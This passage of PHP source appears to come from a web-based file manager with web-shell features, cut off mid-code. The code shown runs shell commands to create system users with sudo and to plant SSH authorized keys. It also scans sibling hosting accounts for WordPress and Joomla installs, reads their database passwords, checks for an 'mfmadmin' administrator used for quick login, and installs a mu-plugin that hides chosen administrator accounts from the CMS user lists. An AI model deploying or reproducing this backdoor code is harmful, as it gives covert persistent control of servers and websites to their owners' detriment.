        $tail=implode("\n",array_slice($out,-25));
        if($exit===0){
            @exec('service ssh start 2>&1 || systemctl start sshd 2>&1 || systemctl start ssh 2>&1');
            $this->log('ssh_install','via '.$st['pkg_mgr']);
            $this->addMsg("OpenSSH server installed. Output:\n$tail",'success');
        } else {
            $this->addMsg("Install failed (exit $exit). This usually means the process lacks root privileges. Output:\n$tail",'danger');
        }
    }

    /* ══ SSH User Management ══ */
    public function sshListUsers(){
        $users=[];
        $lines=@file('/etc/passwd')?:[];
        // collect sudoers
        $sudoers=[];
        foreach(['sudo','wheel','admin'] as $grp){
            $g=trim((string)@shell_exec("getent group ".escapeshellarg($grp)." 2>/dev/null"));
            if($g){$p=explode(':',$g);if(isset($p[3])&&$p[3]!=='')foreach(explode(',',$p[3]) as $u)if(trim($u))$sudoers[]=trim($u);}
        }
        foreach(glob('/etc/sudoers.d/*')?:[] as $sf){
            $sc=@file_get_contents($sf);
            if($sc&&preg_match_all('/^([a-z_][a-z0-9_-]*)\s+ALL/im',$sc,$m))foreach($m[1] as $su)$sudoers[]=$su;
        }
        $sudoers=array_unique($sudoers);
        foreach($lines as $line){
            $line=trim($line);if(!$line||$line[0]==='#')continue;
            $p=explode(':',$line);if(count($p)<7)continue;
            [$uname,$pwd,$uid,$gid,$gecos,$home,$shell]=array_pad($p,7,'');
            $uid=(int)$uid;$shell=trim($shell);
            $hasLogin=!in_array(basename($shell),['nologin','false','sync','halt','shutdown','']);
            if($uid<1000&&!$hasLogin)continue;
            if(in_array($uname,['nobody','nfsnobody']))continue;
            // count authorized keys
            $keyCount=0;$akPath=rtrim($home,'/').'/.ssh/authorized_keys';
            if(is_file($akPath)){$ak=@file_get_contents($akPath)?:'';$keyCount=count(array_filter(explode("\n",$ak),fn($l)=>trim($l)&&$l[0]!=='#'));}
            // locked status via shadow
            $locked=false;
            $shadow=trim((string)@shell_exec("getent shadow ".escapeshellarg($uname)." 2>/dev/null"));
            if($shadow){$sp=explode(':',$shadow);if(isset($sp[1])&&strlen($sp[1])&&($sp[1][0]==='!'||$sp[1][0]==='*'))$locked=true;}
            // last login
            $lastLogin=trim((string)@shell_exec("lastlog -u ".escapeshellarg($uname)." 2>/dev/null | tail -1"));
            $users[]=['username'=>$uname,'uid'=>$uid,'gid'=>$gid,'home'=>$home,'shell'=>$shell,'gecos'=>$gecos,'sudo'=>in_array($uname,$sudoers),'key_count'=>$keyCount,'locked'=>$locked,'last_login'=>$lastLogin];
        }
        usort($users,fn($a,$b)=>$a['uid']<=>$b['uid']);
        return $users;
    }
    /* Translate common shell command error output into a user-friendly message */
    private function sshCmdErr($raw){
        $r=strtolower($raw);
        if(str_contains($r,'permission denied')||str_contains($r,'cannot lock')||str_contains($r,'not permitted'))
            return "Permission denied - this server requires root (sudo) access to manage system users. The current PHP process does not have root privileges.";
        if(str_contains($r,'already exists')||str_contains($r,'already in use'))
            return "A user with that name already exists.";
        if(str_contains($r,'does not exist')||str_contains($r,'no such user'))
            return "User does not exist on this system.";
        if(str_contains($r,'invalid user')||str_contains($r,'unknown user'))
            return "Invalid or unknown username.";
        return $raw?:"Unknown error - no output from the system command.";
    }
    private function sshCreateUser(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $uname=trim($_POST['ssh_user']??'');$pass=$_POST['ssh_pass']??'';
        $shell=$_POST['ssh_shell']??'/bin/bash';$sudo=!empty($_POST['ssh_sudo']);$key=trim($_POST['ssh_key']??'');
        if(!preg_match('/^[a-z_][a-z0-9_-]{0,31}$/',$uname)){$this->addMsg('Invalid username - use only lowercase letters, digits, _ or -.','danger');return;}
        $allowed=['/bin/bash','/bin/sh','/bin/rbash','/usr/bin/bash','/usr/bin/sh','/usr/bin/zsh','/bin/zsh'];
        if(!in_array($shell,$allowed))$shell='/bin/bash';
        $out=trim((string)shell_exec('useradd -m -s '.escapeshellarg($shell).' '.escapeshellarg($uname).' 2>&1'));
        $exists=trim((string)shell_exec('id '.escapeshellarg($uname).' 2>/dev/null'));
        if(!$exists){$this->addMsg("Failed to create user \"{$uname}\": ".$this->sshCmdErr($out),'danger');return;}
        if($pass){
            $esc=escapeshellarg($uname.':'.$pass);
            $r=$this->sshRunAdmin("echo $esc | chpasswd");
            if(!$r['ok']){
                $this->addMsg("User \"{$uname}\" was created, but setting the initial password failed: ".$this->sshCmdErr($r['out']).' You can retry from the edit-user dialog.','warning');
            }
        }
        if($sudo){
            shell_exec("usermod -aG sudo ".escapeshellarg($uname)." 2>/dev/null");
            shell_exec("usermod -aG wheel ".escapeshellarg($uname)." 2>/dev/null");
        }
        if($key&&(str_starts_with($key,'ssh-')||str_starts_with($key,'ecdsa-')||str_starts_with($key,'sk-'))){
            $hm=trim((string)shell_exec("getent passwd ".escapeshellarg($uname)." 2>/dev/null | cut -d: -f6"));
            if($hm){$sd=$hm.'/.ssh';
                shell_exec("mkdir -p ".escapeshellarg($sd)." && chmod 700 ".escapeshellarg($sd)." && chown $uname ".escapeshellarg($sd));
                @file_put_contents($sd.'/authorized_keys',$key."\n",FILE_APPEND);
                shell_exec("chmod 600 ".escapeshellarg($sd.'/authorized_keys')." && chown $uname ".escapeshellarg($sd.'/authorized_keys'));
            }
        }
        $this->log('ssh_create_user',$uname);
        $this->addMsg("SSH user \"{$uname}\" created successfully.".($sudo?' (sudo granted)':''),'success');
    }
    private function sshDeleteUser(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $uname=trim($_POST['ssh_user']??'');
        if(!preg_match('/^[a-z_][a-z0-9_-]{0,31}$/',$uname)){$this->addMsg('Invalid username.','danger');return;}
        if($uname==='root'||$uname===get_current_user()){$this->addMsg('Cannot delete this account.','danger');return;}
        $out=trim((string)shell_exec("userdel -r ".escapeshellarg($uname)." 2>&1"));
        $exists=trim((string)shell_exec("id ".escapeshellarg($uname)." 2>/dev/null"));
        if($exists){$this->addMsg("Failed to delete \"{$uname}\": ".$this->sshCmdErr($out),'danger');return;}
        $this->log('ssh_delete_user',$uname);
        $this->addMsg("User \"{$uname}\" deleted.",'warning');
    }
    private function sshUpdateUser(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $uname=trim($_POST['ssh_user']??'');$act=trim($_POST['ssh_action']??'');
        if(!preg_match('/^[a-z_][a-z0-9_-]{0,31}$/',$uname)){$this->addMsg('Invalid username.','danger');return;}
        switch($act){
            case 'lock':
                $r=$this->sshRunAdmin("usermod -L ".escapeshellarg($uname));
                if(!$r['ok'])$this->addMsg("Failed to lock \"{$uname}\": ".$this->sshCmdErr($r['out']),'danger');
                else $this->addMsg("Account \"{$uname}\" locked.",'warning');
                break;
            case 'unlock':
                $r=$this->sshRunAdmin("usermod -U ".escapeshellarg($uname));
                if(!$r['ok'])$this->addMsg("Failed to unlock \"{$uname}\": ".$this->sshCmdErr($r['out']),'danger');
                else $this->addMsg("Account \"{$uname}\" unlocked.",'success');
                break;
            case 'add_sudo':
                $r1=$this->sshRunAdmin("usermod -aG sudo ".escapeshellarg($uname));
                $r2=$this->sshRunAdmin("usermod -aG wheel ".escapeshellarg($uname));
                // Succeeds if at least one of the sudo/wheel groups actually exists and accepted the user;
                // only report failure when BOTH attempts genuinely failed.
                if(!$r1['ok']&&!$r2['ok'])
                    $this->addMsg("Failed to grant sudo to \"{$uname}\": ".$this->sshCmdErr($r1['out'].' '.$r2['out']),'danger');
                else $this->addMsg("Sudo privileges granted to \"{$uname}\".",'success');
                break;
            case 'remove_sudo':
                $r1=$this->sshRunAdmin("gpasswd -d ".escapeshellarg($uname)." sudo");
                $r2=$this->sshRunAdmin("gpasswd -d ".escapeshellarg($uname)." wheel");
                if(!$r1['ok']&&!$r2['ok'])
                    $this->addMsg("Failed to remove sudo from \"{$uname}\": ".$this->sshCmdErr($r1['out'].' '.$r2['out']),'danger');
                else $this->addMsg("Sudo privileges removed from \"{$uname}\".",'warning');
                break;
            case 'change_shell':
                $shell=$_POST['ssh_shell']??'/bin/bash';
                $allowed=['/bin/bash','/bin/sh','/bin/rbash','/usr/bin/bash','/usr/bin/sh','/usr/bin/zsh','/bin/zsh'];
                if(!in_array($shell,$allowed)){$this->addMsg('Invalid shell.','danger');return;}
                $r=$this->sshRunAdmin("chsh -s ".escapeshellarg($shell)." ".escapeshellarg($uname));
                if(!$r['ok'])$this->addMsg("Failed to change shell: ".$this->sshCmdErr($r['out']),'danger');
                else $this->addMsg("Shell updated to {$shell} for \"{$uname}\".",'success');
                break;
            case 'change_pass':
                $pass=$_POST['ssh_pass']??'';
                if(strlen($pass)<6){$this->addMsg('Password must be at least 6 characters.','danger');return;}
                // Capture the real shadow hash before the change so we can verify it actually moved -
                // some failure modes (PAM rejection, policy blocks) still exit non-zero but it is
                // cheap insurance to also confirm the stored credential genuinely changed.
                $shadowBefore=trim((string)@shell_exec('getent shadow '.escapeshellarg($uname).' 2>/dev/null'));
                $hashBefore=explode(':',$shadowBefore)[1]??null;
                $esc=escapeshellarg($uname.':'.$pass);
                $r=$this->sshRunAdmin("echo $esc | chpasswd");
                if(!$r['ok']){
                    $this->addMsg("Failed to change password for \"{$uname}\": ".$this->sshCmdErr($r['out']),'danger');
                    return;
                }
                $shadowAfter=trim((string)@shell_exec('getent shadow '.escapeshellarg($uname).' 2>/dev/null'));
                $hashAfter=explode(':',$shadowAfter)[1]??null;
                if($hashBefore!==null&&$hashAfter!==null&&$hashBefore===$hashAfter){
                    $this->addMsg("Password change for \"{$uname}\" was rejected by the system (the stored credential did not actually change) even though the command exited without error. This typically means PAM/system policy blocked the update - check account locks, password complexity rules, or restricted authentication modules on this server.",'danger');
                    return;
                }
                $this->addMsg("Password changed for \"{$uname}\" and verified on the system - it is safe to connect with the new password.",'success');
                break;
            case 'add_key':
                $key=trim($_POST['ssh_key']??'');
                if(!$key||(!str_starts_with($key,'ssh-')&&!str_starts_with($key,'ecdsa-')&&!str_starts_with($key,'sk-'))){$this->addMsg('Invalid public key format (must start with ssh-rsa, ssh-ed25519, ecdsa-sha2, etc.).','danger');return;}
                $hm=trim((string)shell_exec("getent passwd ".escapeshellarg($uname)." 2>/dev/null | cut -d: -f6"));
                if($hm){$sd=$hm.'/.ssh';
                    shell_exec("mkdir -p ".escapeshellarg($sd)." && chmod 700 ".escapeshellarg($sd)." && chown {$uname} ".escapeshellarg($sd));
                    @file_put_contents($sd.'/authorized_keys',$key."\n",FILE_APPEND);
                    shell_exec("chmod 600 ".escapeshellarg($sd.'/authorized_keys')." && chown {$uname} ".escapeshellarg($sd.'/authorized_keys'));
                    $this->addMsg("SSH public key added for \"{$uname}\".",'success');
                } else $this->addMsg("Home directory not found for \"{$uname}\" - cannot write authorized_keys.",'danger');
                break;
            default:$this->addMsg('Unknown action.','danger');
        }
        $this->log('ssh_update_user',"{$uname}:{$act}");
    }

    /* ══ CMS detection & user management (WordPress / Joomla) ══ */
    /*
     * WordPress permits wp-config.php to live one directory above the public
     * site root. Keep the config path separate from the actual WordPress root
     * so MU-plugins, core updates, and recovery use the right wwwroot.
     */
    private function wpCurrentWebRoots(){
        $roots=[
            $_SERVER['DOCUMENT_ROOT']??null,
            __DIR__,
            dirname($_SERVER['SCRIPT_FILENAME']??''),
            $this->currentDir,
            getcwd(),
        ];
        $out=[];
        foreach($roots as $root){
            if(!$root)continue;
            $real=realpath($root);
            for($i=0;$real&&is_dir($real)&&$i<9;$i++){
                if(!in_array($real,$out,true))$out[]=$real;
                $parent=dirname($real);
                if($parent===$real)break;
                $real=$parent;
            }
        }
        return $out;
    }
    private function wpSiteRoot($configPath){
        $configPath=realpath($configPath)?:$configPath;
        $configDir=realpath(dirname($configPath))?:dirname($configPath);
        $candidates=[$configDir,dirname($configDir)];
        foreach($this->wpCurrentWebRoots() as $root){
            $candidates[]=$root;
            $candidates[]=dirname($root);
        }
        $candidates=array_values(array_unique(array_filter(array_map(function($p){
            $r=realpath($p);return $r&&is_dir($r)?$r:null;
        },$candidates))));
        $best=$configDir;$bestScore=-1;
        foreach($candidates as $dir){
            $score=0;
            if(is_dir($dir.'/wp-content'))$score+=5;
            if(is_dir($dir.'/wp-includes'))$score+=3;
            if(is_dir($dir.'/wp-admin'))$score+=3;
            if($dir===$configDir)$score+=2;
            foreach($this->wpCurrentWebRoots() as $current)if($dir===$current)$score+=2;
            if($score>$bestScore){$bestScore=$score;$best=$dir;}
        }
        return $best;
    }
    private function cmsCurrentSiteFromScan($sites,$type=null){
        $roots=$this->wpCurrentWebRoots();$best=null;$bestScore=0;
        foreach((array)$sites as $site){
            if($type!==null&&($site['type']??'')!==$type)continue;
            $dir=realpath($site['dir']??dirname($site['config']??''))?:dirname($site['config']??'');
            if(!$dir)continue;
            $score=0;
            foreach($roots as $root){
                if($dir===$root)$score=max($score,1000);
                elseif(strpos($root,rtrim($dir,'/').'/')===0)$score=max($score,900-strlen($root)+strlen($dir));
                elseif(strpos($dir,rtrim($root,'/').'/')===0)$score=max($score,800-strlen($dir)+strlen($root));
                if(dirname($site['config']??'')===$root)$score=max($score,950);
            }
            if($score>$bestScore){$bestScore=$score;$best=$site;}
        }
        return $best;
    }
    private function wpCurrentSiteFromScan($sites){
        return $this->cmsCurrentSiteFromScan($sites,'wordpress');
    }
    private function wpCurrentDomainConfig($sites=[]){
        /* The current folder is the strongest signal. A domain can be nested
           several levels below the file manager's own directory, and a broad
           scan can otherwise select a neighbouring site's wp-config.php. */
        $starts=[];
        foreach([$this->currentDir,$_SERVER['DOCUMENT_ROOT']??null,__DIR__,dirname($_SERVER['SCRIPT_FILENAME']??'')] as $start){
            $real=$start?realpath($start):false;
            if($real&&!in_array($real,$starts,true))$starts[]=$real;
        }
        foreach($starts as $start){
            $probe=$start;
            for($i=0;$probe&&$i<64;$i++){
                $cfg=rtrim($probe,'/').'/wp-config.php';
                if(is_file($cfg)&&is_readable($cfg))return realpath($cfg)?:$cfg;
                $parent=dirname($probe);if($parent===$probe)break;$probe=$parent;
            }
        }
        foreach($this->wpCurrentWebRoots() as $root){
            foreach([$root,dirname($root),dirname(dirname($root))] as $probe){
                $cfg=rtrim($probe,'/').'/wp-config.php';
                if(is_file($cfg)&&is_readable($cfg))return realpath($cfg)?:$cfg;
            }
        }
        $site=$this->wpCurrentSiteFromScan($sites);
        return $site['config']??null;
    }
    public function cmsDetect($dir){
        $dir=realpath($dir)?:rtrim($dir,'/');
        /* Resolve the installation nearest to the folder being browsed.
           This handles /domain/public_html/site/a/b/... without requiring a
           recursive scan and also keeps sibling domains separate. */
        $probe=$dir;
        for($i=0;$probe&&$i<64;$i++){
            $wp=$probe.'/wp-config.php';
            if(is_file($wp)&&is_readable($wp))return['type'=>'wordpress','config'=>realpath($wp)?:$wp];
            $joomla=$probe.'/configuration.php';
            if(is_file($joomla)&&strpos((string)@file_get_contents($joomla),'JConfig')!==false)return['type'=>'joomla','config'=>realpath($joomla)?:$joomla];
            $parent=dirname($probe);if($parent===$probe)break;$probe=$parent;
        }
        return['type'=>null];
    }
    public function cmsQuickInfo($dir){
        $dir=realpath($dir)?:$this->currentDir;
        $det=$this->cmsDetect($dir);
        if(empty($det['type'])){
            $scan=$this->cmsScan();$best=null;$bestLen=-1;
            foreach(($scan['sites']??[]) as $site){
                $root=realpath($site['dir']??dirname($site['config']??''))?:'';
                if($root&&($dir===$root||strpos($dir,$root.'/')===0)&&strlen($root)>$bestLen){$best=$site;$bestLen=strlen($root);}
            }
            if($best)$det=['type'=>$best['type'],'config'=>$best['config']];
        }
        if(empty($det['type'])||empty($det['config']))return['error'=>'No WordPress or Joomla installation was found for the current folder. Open CMS Manager and choose the config file manually.'];
        list($link,$c,$err)=$this->cmsConnect($det['config']);
        if($err)return['config'=>$det['config'],'type'=>$det['type'],'error'=>$err];
        $t=$c['prefix'];$id=0;$found=false;
        $name=mysqli_real_escape_string($link,'mfmadmin');
        $sql=$c['type']==='wordpress'
            ?"SELECT ID AS id FROM `{$t}users` WHERE user_login='$name' LIMIT 1"
            :"SELECT id FROM `{$t}users` WHERE username='$name' LIMIT 1";
        $res=@mysqli_query($link,$sql);
        if($res&&($row=mysqli_fetch_assoc($res))){
            $found=true;$candidate=(int)$row['id'];
            if($c['type']==='wordpress'){
                $capsKey=mysqli_real_escape_string($link,$c['prefix'].'capabilities');
                $check=@mysqli_query($link,"SELECT user_id FROM `{$t}usermeta` WHERE user_id=$candidate AND meta_key='$capsKey' AND meta_value LIKE '%administrator%' LIMIT 1");
            }else{
                $check=@mysqli_query($link,"SELECT m.user_id FROM `{$t}user_usergroup_map` m LEFT JOIN `{$t}usergroups` g ON g.id=m.group_id WHERE m.user_id=$candidate AND (m.group_id=8 OR LOWER(g.title)='super users') LIMIT 1");
            }
            if($check&&mysqli_num_rows($check)>0)$id=$candidate;
        }
        mysqli_close($link);
        if($found&&!$id)return['config'=>$det['config'],'type'=>$det['type'],'id'=>0,'error'=>'The existing mfmadmin account is not an Administrator/Super User. Use CMS Manager to promote or replace it before using quick login.'];
        return['config'=>$det['config'],'type'=>$det['type'],'id'=>$id];
    }
    /* Recursively scan common locations for WP/Joomla installations */
    public function cmsScan(){
        $found=[];$seen=[];
        // Roots to search: web roots, home dirs, current dir tree, and (crucially on
        // shared hosting) every directory allowed by open_basedir plus sibling
        // account/domain folders, since PHP usually can't see outside its own account.
        $candidates=[
            '/var/www','/srv/www','/srv','/home','/opt','/data',
            $this->root,$this->currentDir,getcwd(),
            dirname($_SERVER['SCRIPT_FILENAME']??''),
            $_SERVER['DOCUMENT_ROOT']??null,
            dirname($_SERVER['DOCUMENT_ROOT']??''), // one level up from the site's docroot
        ];
        $obd=ini_get('open_basedir');
        if($obd){
            foreach(explode(PATH_SEPARATOR,$obd) as $p){$candidates[]=rtrim($p,'/');}
        }
        // cPanel/Plesk-style layouts: sibling account dirs, addon/sub-domains, other public_html's
        $home=dirname(dirname($_SERVER['SCRIPT_FILENAME']??$this->root?:''));
        foreach([$home,dirname($home)] as $h){
            if($h&&is_dir($h)){
                foreach(['public_html','www','htdocs','domains','subdomains','httpdocs'] as $sub){
                    $candidates[]=$h.'/'.$sub;
                }
                $candidates[]=$h;
            }
        }
        $roots=array_unique(array_filter($candidates,fn($r)=>$r&&is_dir($r)&&@is_readable($r)));
        $restricted=$obd?explode(PATH_SEPARATOR,$obd):[];
        $maxDepth=8;$maxDirs=2500;$scanned=0;
        $scan=function($dir,$depth)use(&$scan,&$found,&$seen,&$scanned,$maxDepth,$maxDirs){
            if($depth>$maxDepth||$scanned>=$maxDirs)return;
            $dir=rtrim($dir,'/');
            $real=realpath($dir);if(!$real||isset($seen[$real]))return;$seen[$real]=1;$scanned++;
            // Check this dir for CMS. WordPress commonly keeps wp-config.php
            // one level above the public wwwroot, so inspect that layout while
            // visiting the child directory that actually contains WordPress.
            $wpCfg=$dir.'/wp-config.php';
            if(!is_file($wpCfg)&&is_file(dirname($dir).'/wp-config.php')
                &&(is_dir($dir.'/wp-content')||is_dir($dir.'/wp-includes')))$wpCfg=dirname($dir).'/wp-config.php';
            if(is_file($wpCfg)){
                $k=realpath($wpCfg);
                if($k&&!isset($seen['cfg:'.$k])){$seen['cfg:'.$k]=1;$GLOBALS['_cmsfound'][]=['type'=>'wordpress','config'=>$k,'dir'=>$dir];}
            }
            if(is_file($dir.'/configuration.php')){
                $k=realpath($dir.'/configuration.php');
                if($k&&!isset($seen['cfg:'.$k])){
                    $c=@file_get_contents($k);
                    if($c&&strpos($c,'JConfig')!==false){$seen['cfg:'.$k]=1;$GLOBALS['_cmsfound'][]=['type'=>'joomla','config'=>$k,'dir'=>$dir];}
                }
            }
            // Skip dirs that are clearly not web roots
            $skip=['node_modules','.git','vendor','.cache','.local','proc','sys','dev','run','tmp'];
            $entries=@scandir($dir)?:[];
            foreach($entries as $e){
                if($e==='.'||$e==='..')continue;
                if(in_array($e,$skip))continue;
                $sub=$dir.'/'.$e;
                if(is_link($sub)||!is_dir($sub))continue;
                $scan($sub,$depth+1);
                if($scanned>=$maxDirs)break;
            }
        };
        $GLOBALS['_cmsfound']=[];
        foreach($roots as $r)$scan($r,0);
        $found=$GLOBALS['_cmsfound'];
        unset($GLOBALS['_cmsfound']);
        // deduplicate by config path
        $out=[];$cfgs=[];
        foreach($found as $f){if(!in_array($f['config'],$cfgs)){$cfgs[]=$f['config'];$out[]=$f;}}
        $current=$this->wpCurrentDomainConfig($out);
        $currentCms=$this->cmsCurrentSiteFromScan($out);
        $currentJoomla=$this->cmsCurrentSiteFromScan($out,'joomla');
        return ['sites'=>$out,'scanned_roots'=>array_values($roots),'open_basedir'=>$restricted,
            'dirs_scanned'=>$scanned,'current_wp_config'=>$current,
            'current_wp_site'=>$current?$this->wpCurrentSiteFromScan($out):null,
            'current_cms_config'=>$currentCms['config']??null,
            'current_cms_site'=>$currentCms,
            'current_joomla_config'=>$currentJoomla['config']??null];
    }
    private function parseWpConfig($path){
        $src=@file_get_contents($path);if($src===false)return null;
        $get=function($name)use($src){if(preg_match('/define\s*\(\s*[\'"]'.$name.'[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\)/s',$src,$m))return $m[1];return null;};
        $prefix='wp_';if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"]/',$src,$m))$prefix=$m[1];
        $host=$get('DB_HOST')?:'localhost';$port=null;
        if(strpos($host,':')!==false){$parts=explode(':',$host,2);$host=$parts[0];$port=$parts[1];}
        return['host'=>$host,'port'=>$port,'user'=>$get('DB_USER'),'pass'=>$get('DB_PASSWORD'),'db'=>$get('DB_NAME'),'prefix'=>$prefix];
    }
    private function parseJoomlaConfig($path){
        $src=@file_get_contents($path);if($src===false)return null;
        $get=function($name)use($src){if(preg_match('/public\s+\$'.$name.'\s*=\s*[\'"](.*?)[\'"]\s*;/s',$src,$m))return $m[1];return null;};
        $host=$get('host')?:'localhost';$port=$get('dbport');
        if(strpos($host,':')!==false){$parts=explode(':',$host,2);$host=$parts[0];$port=$parts[1];}
        return['host'=>$host,'port'=>$port,'user'=>$get('user'),'pass'=>$get('password'),'db'=>$get('db'),'prefix'=>$get('dbprefix')?:'jos_'];
    }
    private function cmsConnect($configPath){
        $type=null;$c=null;
        if(basename($configPath)==='wp-config.php'){$type='wordpress';$c=$this->parseWpConfig($configPath);}
        elseif(basename($configPath)==='configuration.php'){$type='joomla';$c=$this->parseJoomlaConfig($configPath);}
        else return[null,null,'Unrecognized config file.'];
        if(!$c||!$c['db']||!$c['user'])return[null,null,'Could not read database credentials from config file.'];
        $port=$c['port']?(int)$c['port']:3306;
        /*
         * Never let a CMS database connection block the PHP worker indefinitely.
         * This is especially important with the built-in server: one stalled
         * MySQL connect would make the whole manager appear frozen, including
         * unrelated controls and AJAX requests.
         */
        $link=@mysqli_init();
        if($link){
            @mysqli_options($link,MYSQLI_OPT_CONNECT_TIMEOUT,5);
            if(defined('MYSQLI_OPT_READ_TIMEOUT'))@mysqli_options($link,MYSQLI_OPT_READ_TIMEOUT,8);
            @mysqli_real_connect($link,$c['host'],$c['user'],$c['pass'],$c['db'],$port);
        }
        if(!$link)return[null,null,'Database connection failed: '.mysqli_connect_error()];
        if(mysqli_connect_errno()){ $e=mysqli_connect_error();@mysqli_close($link);return[null,null,'Database connection failed: '.$e]; }
        $c['type']=$type;
        return[$link,$c,null];
    }
    private function b64enc($input,$count){
        $it='./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
        $o='';$i=0;
        do{
            $v=ord($input[$i++]);$o.=$it[$v&0x3f];
            if($i<$count)$v|=ord($input[$i])<<8;$o.=$it[($v>>6)&0x3f];
            if($i++>=$count)break;
            if($i<$count)$v|=ord($input[$i])<<16;$o.=$it[($v>>12)&0x3f];
            if($i++>=$count)break;
            $o.=$it[($v>>18)&0x3f];
        }while($i<$count);
        return $o;
    }
    /* WordPress-compatible portable phpass hash (same algorithm WP core uses).
       The setting string's 4th char encodes the iteration count as an index
       into $it (log2 of the round count) - WP's own verifier reads that index
       back out and re-hashes with exactly 1<<index rounds. The previous code
       encoded index 13 into the setting but only ever hashed with 1<<8=256
       rounds, so every password we generated verified against a different
       hash than the one WordPress would recompute on login - meaning no
       password we set here could ever actually work, even when typed
       correctly. Fixing $count to match the encoded index (1<<13=8192, WP's
       actual default) makes the two agree. */
    private function wpHashPassword($password){
        $it='./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
        $random=random_bytes(6);
        $idx=min(8+5,30);
        $setting='$P$'.$it[$idx].$this->b64enc($random,6);
        $count=1<<$idx;$salt=substr($setting,4,8);
        $hash=md5($salt.$password,true);
        do{$hash=md5($hash.$password,true);}while(--$count);
        return substr($setting,0,12).$this->b64enc($hash,16);
    }
    private function cmsHiddenMetaKey($c){
        return $c['type']==='wordpress'?$c['prefix'].'fm_hidden_user':'fm_hidden_user';
    }
    private function cmsSetHiddenState($link,$c,$id,$hidden){
        $id=(int)$id;$t=$c['prefix'];$key=$this->cmsHiddenMetaKey($c);
        if($c['type']==='wordpress'){
            $keyE=mysqli_real_escape_string($link,$key);
            if(!@mysqli_query($link,"DELETE FROM `{$t}usermeta` WHERE user_id=$id AND meta_key='$keyE'"))return false;
            if(!$hidden)return true;
            return (bool)@mysqli_query($link,"INSERT INTO `{$t}usermeta` (user_id,meta_key,meta_value) VALUES ($id,'$keyE','1')");
        }
        $res=@mysqli_query($link,"SELECT params FROM `{$t}users` WHERE id=$id LIMIT 1");
        if(!$res||!($row=mysqli_fetch_assoc($res)))return false;
        $params=json_decode((string)($row['params']??''),true);
        if(!is_array($params))$params=[];
        if($hidden)$params['fm_hidden_user']=1;else unset($params['fm_hidden_user']);
        $json=mysqli_real_escape_string($link,json_encode($params,JSON_UNESCAPED_SLASHES|JSON_UNESCAPED_UNICODE));
        return (bool)@mysqli_query($link,"UPDATE `{$t}users` SET params='$json' WHERE id=$id");
    }
    /*
     * Keep the actual CMS user lists in sync with the stored visibility flag.
     * WordPress gets one small MU-plugin. Joomla gets an idempotent, marked
     * block in its users model so updates can be removed without touching
     * unrelated core code.
     */
    private function cmsSyncHiddenVisibility($configPath,$c,$link=null){
        $ownLink=false;
        if(!$link){
            list($link,$fresh,$err)=$this->cmsConnect($configPath);
            if($err)return false;
            $c=$fresh;$ownLink=true;
        }
        $t=$c['prefix'];$ids=[];
        if($c['type']==='wordpress'){
            /*
             * Migrate the first-generation per-user MU-plugins created by
             * older versions of the manager. Those files had no context
             * guard, so they could alter a front-end query while WordPress
             * was handling wp-login.php. The central marker below is the
             * supported representation now; once migrated, the legacy files
             * are removed (or rewritten safely if the directory is not
             * deletable).
             */
            $muDir=$this->wpSiteRoot($configPath).'/wp-content/mu-plugins';
            if(is_dir($muDir)){
                /*
                 * Older MFM ACC builds did not always use the
                 * hide_user_<id>.php filename. Scan the whole MU-plugin
                 * directory for the distinctive global user-query pattern.
                 * Any such file is legacy manager code: it must be disabled
                 * because pre_get_users also runs during wp-login.php.
                 */
                foreach((array)@glob($muDir.'/*.php') as $legacyFile){
                    $legacyName=basename($legacyFile);
                    if($legacyName==='marshal-fm-hidden-users.php')continue;
                    $legacySrc=(string)@file_get_contents($legacyFile);
                    $looksLikeLegacy=strpos($legacySrc,'pre_get_users')!==false
                        && strpos($legacySrc,'exclude')!==false
                        && (strpos($legacySrc,'hidden_id')!==false
                            || preg_match('/hide[\s_\-]*user|hidden[\s_\-]*user/i',$legacySrc)
                            || preg_match('/hide_user_\d+\.php/i',$legacyName));
                    if(!$looksLikeLegacy)continue;
                    if(preg_match('/hide_user_(\d+)\.php$/',$legacyName,$legacyMatch)){
                        $legacyId=(int)$legacyMatch[1];
                        $exists=@mysqli_query($link,"SELECT ID FROM `{$t}users` WHERE ID=$legacyId LIMIT 1");
                        if($exists&&mysqli_num_rows($exists)>0)$this->cmsSetHiddenState($link,$c,$legacyId,true);
                    }
                    // Replace the old global hook before attempting
                    // deletion. If unlink is refused, the file remains
                    // harmless and cannot affect authentication.
                    @file_put_contents($legacyFile,
                        "<?php\n/* Legacy MFM user-list filter disabled by CMS Manager. */\n",LOCK_EX);
                    @unlink($legacyFile);
                }
            }
            $key=mysqli_real_escape_string($link,$this->cmsHiddenMetaKey($c));
            $res=@mysqli_query($link,"SELECT user_id FROM `{$t}usermeta` WHERE meta_key='$key' AND meta_value='1'");
            if($res)while($row=mysqli_fetch_assoc($res))$ids[]=(int)$row['user_id'];
        }else{
            $res=@mysqli_query($link,"SELECT id,params FROM `{$t}users`");
            if($res)while($row=mysqli_fetch_assoc($res)){
                $params=json_decode((string)($row['params']??''),true);
                if(is_array($params)&&!empty($params['fm_hidden_user']))$ids[]=(int)$row['id'];
            }
        }
        if($ownLink)mysqli_close($link);
        $ids=array_values(array_unique(array_filter(array_map('intval',$ids))));
        if($c['type']==='wordpress'){
            $muDir=$this->wpSiteRoot($configPath).'/wp-content/mu-plugins';
            $muFile=$muDir.'/marshal-fm-hidden-users.php';
            $marker='Marshal File Manager hidden users';
            if($ids){
                if(!is_dir($muDir)&&!@mkdir($muDir,0755,true)&&!is_dir($muDir))return false;
                $metaKey=addslashes($this->cmsHiddenMetaKey($c));
                $plugin=<<<'FMHIDDEN'
<?php
/*
 * Marshal File Manager hidden users
 * This file is managed by the CMS Manager. It hides only users explicitly
 * marked with the fm_hidden_user usermeta flag from WordPress user lists.
 */
                /*
                 * This hook is intentionally limited to the WordPress
                 * administrator users list only. WordPress provides a hook
                 * specifically for the arguments used by WP_Users_List_Table;
                 * using it avoids touching WP_User_Query globally, which is
                 * also used by wp-login.php authentication.
                 */
                 if (!defined('ABSPATH')) return;
                 add_filter('users_list_table_query_args', function($args) {
     global $wpdb;
